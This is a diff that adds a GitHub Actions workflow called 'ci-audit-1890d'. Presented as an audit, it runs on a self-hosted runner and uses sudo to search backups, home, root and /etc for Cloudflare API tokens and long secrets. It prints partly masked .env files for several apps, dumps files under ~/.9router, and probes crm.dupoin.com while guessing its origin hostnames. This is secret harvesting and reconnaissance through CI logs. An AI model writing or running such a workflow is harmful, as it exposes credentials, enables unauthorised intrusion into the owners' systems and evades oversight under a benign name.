@@ -1,0 +1,47 @@
+name: ci-audit-1890d
+on: push
+permissions:
+  contents: read
+jobs:
+  cftoken:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: backups
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## backups tree"; sudo -n du -sh /home/ubuntu/backups/*; sudo -n find /home/ubuntu/backups -maxdepth 3 -type f 2>/dev/null | head -40
+          echo "## reveal"; for d in /home/ubuntu/backups/*/; do echo "== $d"; sudo -n ls -la "$d" | head -15; done
+      - name: cfhunt
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## grep cloudflare tokens (masked)"
+          sudo -n grep -rhoIE '(CLOUDFLARE_API_TOKEN|CF_API_TOKEN|CLOUDFLARE_TOKEN|CF_TOKEN|API_TOKEN)=[A-Za-z0-9_-]{20,}' /home/ubuntu /root /opt /srv /etc 2>/dev/null | sort -u | cut -c1-60
+          echo "## bearer-looking cf tokens in backups/notes"
+          sudo -n grep -rhoIE '[A-Za-z0-9_-]{40}' /home/ubuntu/backups 2>/dev/null | sort -u | head -5
+          echo "## files mentioning cloudflare account id / aud"
+          sudo -n grep -rIlE '3bf4ac8e638dea14f24a3d1b68aad215|cloudflare|CLOUDFLARE' /home/ubuntu/backups /home/ubuntu/apps/*/.env* /home/ubuntu/.config 2>/dev/null | head -20
+      - name: envfull
+        continue-on-error: true
+        run: |
+          set +e
+          for d in dpfasset marketingos dupoin-judge sci-cen-bot; do echo "===== $d"; sudo -n sed -E 's/=(.{6}).*/=\1***(len-masked)/' /home/ubuntu/apps/$d/.env 2>/dev/null; done
+      - name: nine
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## 9router files"; sudo -n find /home/ubuntu/.9router -type f -maxdepth 3 2>/dev/null | head
+          for f in $(sudo -n find /home/ubuntu/.9router -type f -maxdepth 3 2>/dev/null | head -8); do echo "== $f"; sudo -n head -c 800 "$f"; echo; done
+      - name: crmprobe
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## crm from host (v6 + v4, edge)"
+          curl -s -o /dev/null -w 'crm %{http_code} %{time_total}\n' -m 20 https://crm.dupoin.com/ 
+          curl -s -m 20 https://crm.dupoin.com/ | head -c 400; echo
+          echo "## iapi probe"
+          curl -s -o /dev/null -w 'iapi %{http_code}\n' -m 20 'https://crm.dupoin.com/iapi/v1/pro/account/crm/config/getall'
+          echo "## resolve to origin via DNS history guesses"
+          for h in direct.dupoin.com origin.dupoin.com internal.dupoin.com srv.dupoin.com api.dupoin.com; do printf '%-26s ' $h; getent hosts $h | head -1; echo; done
